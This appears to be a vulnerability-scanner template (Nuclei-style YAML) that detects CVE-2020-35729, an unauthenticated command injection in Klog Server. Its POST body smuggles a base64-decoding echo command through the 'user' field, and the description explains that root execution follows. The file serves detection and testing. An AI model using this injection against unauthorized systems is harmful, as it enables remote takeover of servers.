http:
- body: user={{dummy}}%20%26%20echo%20%cG9jLXRlc3Rpbmc%3D%22%20%7C%20base64%20-d%20%26%20echo%22&pswd={{dummy}}
  matchers:
  - type: word
    words:
    - poc-testing
  method: POST
  path:
  - '{{BaseURL}}/actions/authenticate.php'
id: CVE-2020-35729
info:
  author: dwisiswant0
  classification:
    cpe: cpe:2.3:a:klogserver:klog_server:2.4.1:*:*:*:*:*:*:*
    cve-id: CVE-2020-35729
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.99589
    epss-score: 0.90634
  description: Klog Server 2.4.1 and prior is susceptible to an unauthenticated command
    injection vulnerability. The `authenticate.php` file uses the `user` HTTP POST
    parameter in a call to the `shell_exec()` PHP function without appropriate input
    validation, allowing arbitrary command execution as the apache user. The sudo
    configuration permits the Apache user to execute any command as root without providing
    a password, resulting in privileged command execution as root. Originated from
    Metasploit module, copyright (c) space-r7.
  impact: 'An attacker can execute arbitrary commands on the server, leading to remote
    code execution and potential compromise of the system.

    '
  metadata:
    max-request: 1
    product: klog_server
    vendor: klogserver
  name: Klog Server <=2.41 - Unauthenticated Command Injection
  reference:
  - https://docs.unsafe-inline.com/0day/klog-server-unauthentication-command-injection
  - https://nvd.nist.gov/vuln/detail/CVE-2020-35729
  - https://github.com/mustgundogdu/Research/blob/main/KLOG_SERVER/Exploit_Code
  - https://github.com/mustgundogdu/Research/blob/main/KLOG_SERVER/README.md
  - https://github.com/Z0fhack/Goby_POC
  remediation: 'Upgrade to a patched version of Klog Server (>=2.42) or apply the
    vendor-supplied patch.

    '
  severity: critical
  tags: cve,cve2020,klog,rce,klogserver,vuln
variables:
  dummy: '{{to_lower(rand_text_alpha(5))}}'
